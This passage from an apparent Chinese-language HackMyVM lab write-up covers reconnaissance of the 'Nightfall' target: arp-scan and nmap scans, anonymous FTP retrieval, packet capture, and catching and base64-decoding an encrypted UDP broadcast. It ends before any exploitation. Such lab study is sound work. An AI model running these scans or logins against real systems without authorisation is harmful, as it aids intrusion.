⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣣⢞⣭⠿⠋⠁⠀⠀⠀⠀⠀⠀⠠⣤⣤⣶⣾⣿⣿⣿⣯⣭⣿⣿⣶⣶⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⢿⡿⣿⣿⣿⣿⣿⣿⣿⡵⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠀⠀⠉⠉⠛⠿⠿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⣻⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⠟⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠿⣿⣿⣿⣿⣿⠟⠁⠀⣠⣶⣿⠇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⠀⣾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⠀⠈⠻⣿⣿⡏⠀⣰⠊⠱⠛⡆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠈⠁⠀⠀⠀⠀⣀⣀⣠⠤⠶⠶⠿⣫⠟⠁⠀⠀⠀⠈⠻⣁⣼⠗⣿⠀⢠⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇⠀⠀⠀⠀⠀⣀⣀⣀⣀⣈⣷⠦⠤⠶⠖⠿⣭⣁⣀⣀⣠⣶⡾⠋⠀⠀⠀⠀⠀⠀⠀⠋⠁⢠⡇⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠿⠶⣶⣾⣯⣍⣉⠉⠙⠛⣿⠁⠀⠀⠀⠀⠀⠀⠉⠛⠿⠿⠛⠀⠀⠀⠀⣤⣀⣀⠀⠀⢸⡄⠀⣠⡜⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⡏⠉⠻⢷⣶⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠤⠤⠤⢤⣄⣀⡀⠀⠀⠀⠀⠀⢿⠉⠁⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⠀⠀⢀⣀⣈⣼⠀⠀⠀⠀⠀⣀⣀⡴⠂⠉⠀⠀⠀⣠⢾⠁⠀⣽⠲⡄⠀⠀⠀⢸⡆⠀⠀⠀⠉⠳⢄⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⣴⣏⣁⠀⢻⠀⠀⢀⡴⣺⠝⠀⠀⠀⢀⣀⢶⠛⠁⠸⡄⠀⣿⠀⠹⠄⠀⠀⠈⡇⠀⠀⠀⠀⠀⠀⢙⠲⢄⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣷⢸⡇⠈⠻⣷⣾⠀⠀⣨⠟⣁⣀⣤⣴⠶⠋⠁⢸⠀⠀⠀⣷⠀⣿⠀⠀⠀⠀⠀⢠⡇⠀⠀⠀⢀⡟⠀⢸⠀⠀⠉⠒⠄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⡳⠀⠀⠙⢿⣀⡶⠉⣿⠉⠉⠉⣧⠀⠀⠀⢸⠀⠀⠀⣿⣠⣿⠀⠀⠀⠀⢀⣾⠇⠀⠀⠀⡼⠁⠀⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⠸⠿⣷⡀⠸⡀⠀⠀⠹⡄⠀⠀⠸⢀⣀⡴⠟⣿⠇⠀⠀⠀⠀⣾⡏⠀⠀⠀⣸⠃⠀⢰⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣄⠀⠀⠀⠻⣧⣠⢧⡤⠤⠤⠿⣆⠀⠚⠉⣧⠀⢰⡿⠀⠀⠀⢀⣾⡟⠀⠀⠀⢠⠇⠀⠀⣸⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣀⣀⢀⣤⡦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⠀⠀⣾⠉⠀⠀⣷⠀⠀⠀⢻⡀⠀⠀⢻⠀⣿⠁⠀⠀⢠⣾⡿⠀⠀⠀⢠⡞⠀⠀⢠⡇⠀⠀⠀⠀⠀⠀
⠀⢰⣾⣿⠷⣿⣿⠵⠖⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡀⠘⣆⠀⠀⣿⠀⠀⠀⠀⣧⠀⠀⣸⣾⠃⠀⠀⣠⣿⠟⠀⠀⠀⢀⡞⠀⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀
⠀⠈⡻⠉⠋⠉⢁⣤⣼⡏⢠⣆⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠹⣄⣿⣶⣤⣼⣤⣀⣀⣀⡽⠶⣚⡿⠁⠀⢀⣾⣿⠋⠀⠀⠀⠀⡼⠁⠀⠀⢠⡇⠀⠀⠀⠀⠀⠀⠀
⢰⣶⢟⡴⢾⢇⣏⣤⡿⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣦⠉⠉⠉⠉⠙⠛⠛⠋⠉⠉⠀⠀⣠⣿⣟⠁⠐⠒⠒⠶⡾⠁⠀⠀⠀⡼⠀⠀⠀⠀⠀⠀⠀⠀
⣸⣃⣽⣣⠜⠿⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠈⠳⡄⠀⠀⡼⠁⠀⠀⠀⢰⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠿⠉⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣳⡀⠀⠀⠀⠀⠀⢀⣴⠟⠧⣄⠀⠀⠀⠙⣦⡞⠁⠀⠀⠀⣀⣺⠴⠶⢲⡆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣸⡏⠀⠀⠀⠀⣀⣴⡏⠀⠀⠀⠀⠀⠀⠀⢀⡠⠞⠉⠹⣄⠀⠀⠀⣠⠟⠁⠀⠀⠈⠓⣦⣀⣠⢟⠀⣠⠴⠞⠉⠁⠀⠀⠀⢀⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⣶⠏⢻⣶⡶⣾⣿⣟⡯⠞⠃⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀⠀⠀⠹⣄⣠⣞⠉⠉⠉⠉⠉⠓⠲⢶⠾⠶⢿⠋⠁⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠀
⠀⠀⠈⠀⠉⠉⣉⣻⠉⠉⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠉⠉⠹⣆⠀⠀⠀⠀⠀⠀⠘⣦⠀⠘⡇⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀
⠀⠀⢀⣠⣶⠋⡽⠃⠀⢀⣀⡴⠞⠀⠀⠀⠀⠀⣀⣠⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣄⠀⠀⠀⠀⠀⠀⠈⣳⢶⣿⣀⠀⠀⠀⠀⠀⠀⠀⢸⠁⠀⠀⠀⠀⠀
⠀⠀⠎⠀⣼⠋⠀⠰⢊⣯⡟⠀⢀⣀⡤⠶⠒⠉⠉⠁⠀⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡄⠀⠀⠀⠀⢀⣾⠁⣸⠇⢹⠳⣄⠀⠀⠀⠀⠀⡜⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣯⢉⡶⡆⣸⡉⠓⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣇⠹⡀⠀⠀⣰⠏⡾⠀⣿⠀⢸⠀⠈⣿⢦⡀⠀⢰⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⡿⠋⠁⠁⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⢻⣀⡜⠁⢠⠇⠀⣧⠀⢸⠀⠀⡇⠀⠙⠲⡽⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠉⠀⠀⣿⠀⠀⣿⠀⢸⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡀⠀⠀⠀⠀⠀⠀⠀⠀⢻⠀⠀⠀⠀⠀⠉⠉⠛⢿⡆⢸⡇⢸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡀⠀⠀⠀⠀⠀⠀⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠘⣧⡾⠃⡜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣄⠀⠀⠀⠀⠀⠀⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠿⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠟⠀⠀⠀⠀

           Good job<span class="token operator">!</span><span class="token operator">!</span> You just discovered the criminal<span class="token operator">!</span>



</code></pre>
<p>joker用户能看到flag.txt，结束！还寻思继续提权到root呢，结果这就没了。</p>
]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>隐写</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-Nightfall</title>
    <url>/posts/a8d85fe0/</url>
    <content><![CDATA[<p><strong>难度:medium</strong></p>
<p><strong>kali:192.168.1.105</strong></p>
<p><strong>靶机:192.168.1.104</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> arp-scan <span class="token parameter variable">-l</span>
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.1.105
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.1.1     <span class="token number">78</span>:60:5b:04:b4:8c       TP-LINK TECHNOLOGIES CO.,LTD.
<span class="token number">192.168</span>.1.104   08:00:27:29:3d:eb       PCS Systemtechnik GmbH</code></pre>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> nmap <span class="token number">192.168</span>.1.104               
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-07-21 <span class="token number">12</span>:12 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.1.104
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.000065s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">998</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE
<span class="token number">21</span>/tcp <span class="token function">open</span>  <span class="token function">ftp</span>
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>
MAC Address: 08:00:27:29:3D:EB <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span></code></pre>
<p>不愧是你啊大公鸡,就是不给80端口</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> nmap <span class="token number">192.168</span>.1.104 <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> -p21,22
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-07-21 <span class="token number">12</span>:13 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.1.104
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00025s latency<span class="token punctuation">)</span>.

PORT   STATE SERVICE VERSION
<span class="token number">21</span>/tcp <span class="token function">open</span>  <span class="token function">ftp</span>     ProFTPD
<span class="token operator">|</span> ftp-anon: Anonymous FTP login allowed <span class="token punctuation">(</span>FTP code <span class="token number">230</span><span class="token punctuation">)</span>
<span class="token operator">|</span>_-rw-r--r--   <span class="token number">1</span> <span class="token number">1001</span>     <span class="token number">1001</span>          <span class="token number">124</span> Jun <span class="token number">11</span>  <span class="token number">2021</span> darkness.txt
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">7.7</span> <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">2048</span> 0c:3f:13:54:6e:6e:e6:56:d2:91:eb:ad:95:36:c6:8d <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> 9b:e6:8e:14:39:7a:17:a3:80:88:cd:77:2e:c3:3b:1a <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> <span class="token number">85</span>:5a:05:2a:4b:c0:b2:36:ea:8a:e2:8a:b2:ef:bc:df <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
MAC Address: 08:00:27:29:3D:EB <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Warning: OSScan results may be unreliable because we could not <span class="token function">find</span> at least <span class="token number">1</span> <span class="token function">open</span> and <span class="token number">1</span> closed port
Device type: general purpose
Running: Linux <span class="token number">4</span>.X<span class="token operator">|</span><span class="token number">5</span>.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux <span class="token number">4.15</span> - <span class="token number">5.8</span>
Network Distance: <span class="token number">1</span> hop</code></pre>
<h2 id="FTP匿名登录"><a href="#FTP匿名登录" class="headerlink" title="FTP匿名登录"></a>FTP匿名登录</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">ftp</span> <span class="token number">192.168</span>.1.104
Connected to <span class="token number">192.168</span>.1.104.
<span class="token number">220</span> ProFTPD Server <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span> <span class="token punctuation">[</span>::ffff:192.168.1.104<span class="token punctuation">]</span>
Name <span class="token punctuation">(</span><span class="token number">192.168</span>.1.104:root<span class="token punctuation">)</span>: anonymous
<span class="token number">331</span> Anonymous login ok, send your complete email address as your password
Password: 
<span class="token number">230</span> Anonymous access granted, restrictions apply
Remote system <span class="token builtin class-name">type</span> is UNIX.
Using binary mode to transfer files.
ftp<span class="token operator">></span> <span class="token function">ls</span> <span class="token parameter variable">-al</span>
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">25862</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Opening ASCII mode data connection <span class="token keyword">for</span> <span class="token function">file</span> list
drwxr-xr-x   <span class="token number">2</span> <span class="token function">ftp</span>      nogroup      <span class="token number">4096</span> Jun <span class="token number">11</span>  <span class="token number">2021</span> <span class="token builtin class-name">.</span>
drwxr-xr-x   <span class="token number">2</span> <span class="token function">ftp</span>      nogroup      <span class="token number">4096</span> Jun <span class="token number">11</span>  <span class="token number">2021</span> <span class="token punctuation">..</span>
-rw-r--r--   <span class="token number">1</span> <span class="token number">1001</span>     <span class="token number">1001</span>          <span class="token number">124</span> Jun <span class="token number">11</span>  <span class="token number">2021</span> darkness.txt
<span class="token number">226</span> Transfer complete
ftp<span class="token operator">></span> get darkness.txt
local: darkness.txt remote: darkness.txt
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">6946</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Opening BINARY mode data connection <span class="token keyword">for</span> darkness.txt <span class="token punctuation">(</span><span class="token number">124</span> bytes<span class="token punctuation">)</span>
   <span class="token number">124</span>       <span class="token number">59.06</span> KiB/s 
<span class="token number">226</span> Transfer complete
<span class="token number">124</span> bytes received <span class="token keyword">in</span> 00:00 <span class="token punctuation">(</span><span class="token number">46.39</span> KiB/s<span class="token punctuation">)</span>
ftp<span class="token operator">></span> </code></pre>
<p><img src="https://ooo.0x0.ooo/2024/07/21/ORmpNU.png" alt="ORmpNU.png" loading="lazy"><br>看到这么大的空白我就怀疑有隐写了</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> stegsnow   darkness.txt </code></pre>
<p>没有snow也没有零宽0.0</p>
<h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> tcpdump <span class="token function">host</span> <span class="token number">192.168</span>.1.104        
tcpdump: verbose output suppressed, use -v<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">..</span>. <span class="token keyword">for</span> full protocol decode
listening on eth0, link-type EN10MB <span class="token punctuation">(</span>Ethernet<span class="token punctuation">)</span>, snapshot length <span class="token number">262144</span> bytes
<span class="token number">19</span>:43:03.785230 IP <span class="token number">192.168</span>.1.104.49176 <span class="token operator">></span> <span class="token number">255.255</span>.255.255.24000: UDP, length <span class="token number">2294</span>
<span class="token number">19</span>:43:03.785231 IP <span class="token number">192.168</span>.1.104 <span class="token operator">></span> <span class="token number">255.255</span>.255.255: udp
<span class="token number">19</span>:43:04.287550 IP <span class="token number">192.168</span>.1.104.57943 <span class="token operator">></span> <span class="token number">255.255</span>.255.255.24000: UDP, length <span class="token number">2294</span>
<span class="token number">19</span>:43:04.287551 IP <span class="token number">192.168</span>.1.104 <span class="token operator">></span> <span class="token number">255.255</span>.255.255: udp
<span class="token number">19</span>:43:04.789685 IP <span class="token number">192.168</span>.1.104.47668 <span class="token operator">></span> <span class="token number">255.255</span>.255.255.24000: UDP, length <span class="token number">2294</span>
<span class="token number">19</span>:43:04.789697 IP <span class="token number">192.168</span>.1.104 <span class="token operator">></span> <span class="token number">255.255</span>.255.255: udp
<span class="token number">19</span>:43:05.292215 IP <span class="token number">192.168</span>.1.104.54752 <span class="token operator">></span> <span class="token number">255.255</span>.255.255.24000: UDP, length <span class="token number">2294</span>
<span class="token number">19</span>:43:05.292216 IP <span class="token number">192.168</span>.1.104 <span class="token operator">></span> <span class="token number">255.255</span>.255.255: udp
<span class="token number">19</span>:43:05.794125 IP <span class="token number">192.168</span>.1.104.38420 <span class="token operator">></span> <span class="token number">255.255</span>.255.255.24000: UDP, length <span class="token number">2294</span>
<span class="token number">19</span>:43:05.794141 IP <span class="token number">192.168</span>.1.104 <span class="token operator">></span> <span class="token number">255.255</span>.255.255: udp
<span class="token number">19</span>:43:06.296009 IP <span class="token number">192.168</span>.1.104.56061 <span class="token operator">></span> <span class="token number">255.255</span>.255.255.24000: UDP, length <span class="token number">2294</span>
<span class="token number">19</span>:43:06.296010 IP <span class="token number">192.168</span>.1.104 <span class="token operator">></span> <span class="token number">255.255</span>.255.255: udp
<span class="token number">19</span>:43:06.798001 IP <span class="token number">192.168</span>.1.104.33462 <span class="token operator">></span> <span class="token number">255.255</span>.255.255.24000: UDP, length <span class="token number">2294</span>
<span class="token number">19</span>:43:06.798078 IP <span class="token number">192.168</span>.1.104 <span class="token operator">></span> <span class="token number">255.255</span>.255.255: udp
<span class="token number">19</span>:43:07.299941 IP <span class="token number">192.168</span>.1.104.55860 <span class="token operator">></span> <span class="token number">255.255</span>.255.255.24000: UDP, length <span class="token number">2294</span>
<span class="token number">19</span>:43:07.299967 IP <span class="token number">192.168</span>.1.104 <span class="token operator">></span> <span class="token number">255.255</span>.255.255: udp
<span class="token number">19</span>:43:31.421525 IP <span class="token number">192.168</span>.1.104.39962 <span class="token operator">></span> <span class="token number">255.255</span>.255.255.24000: UDP, length <span class="token number">2294</span>
<span class="token number">19</span>:43:31.421815 IP <span class="token number">192.168</span>.1.104 <span class="token operator">></span> <span class="token number">255.255</span>.255.255: udp
<span class="token number">19</span>:43:31.924051 IP <span class="token number">192.168</span>.1.104.56808 <span class="token operator">></span> <span class="token number">255.255</span>.255.255.24000: UDP, length <span class="token number">2294</span></code></pre>
<p>发现靶机会广播一个udp包，端口是24000,接收一下看看是什么</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">nc</span> <span class="token parameter variable">-lvnup</span> <span class="token number">24000</span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">24000</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.1.105<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.1.104<span class="token punctuation">]</span> <span class="token number">45097</span>
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<span class="token operator">==</span></code></pre>
<p>是一串base64</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"> ~/Desktop                                                                                                                                                                                                                                                                                           root@kali2  <span class="token number">19</span>:44:57 
<span class="token operator">></span> <span class="token function">cat</span> aaa <span class="token operator">|</span> base64 <span class="token parameter variable">-d</span> <span class="token operator">></span> bbb

 ~/Desktop                                                                                                                                                                                                                                                                                           root@kali2  <span class="token number">19</span>:45:05 
<span class="token operator">></span> <span class="token function">cat</span> bbb                  
Salted__�<span class="token punctuation">;</span>��?���<span class="token string">"��E8�=5=#�"</span><span class="token string">'k�������&lt;v77?��g�˾$��Nu▒������y�2����I�b5�R����▒p�)���i������:����;ޟ�-�����-������F�&#125;\
�g��&lt;����^��n6��?Y�pW���3OW�;��[jRt4u�ѲN%�&lt;![8�����H��ߏ��>�!�ƻx-I
G��IT����Qw_�ՒB2*�+���0I"�&#125;� ��R��                               :-��O2D�ѱ����D�s�?�=0o��*n��   �▒�)�eRkkdJ!�c,A�y����Pd��Wr�����\��|�Ow��q���\)-0A��9`&amp;g�����▒8���▒w����?��@+��
7k?7�3���,��I�
              ��F��3��Q>��z�*�6
                               .m�15���CȢt��y����v�v�c▒;�0�N�R���w���
                                                                     �h��0��/�r��:i�2�$�&lt;�%�\��XG��2�dv˲��D�Lx��X:_$��2~S-n^`�
M'</span>�����<span class="token punctuation">)</span>h�<span class="token variable">$1</span>�^��/u�t��d�i�<span class="token punctuation">]</span>�<span class="token operator">&amp;</span>�B��4�o<span class="token operator">|</span>�<span class="token comment">#�U?������@��~�,-����1akq���6-q8&#123;�C�$��Xe�Ֆ�d�OI-o�_GI�-j�IM��m�� �Jg�uw?��1���j���3���Vw▒ʆ�;�;����Fz�(�&lt;A</span>
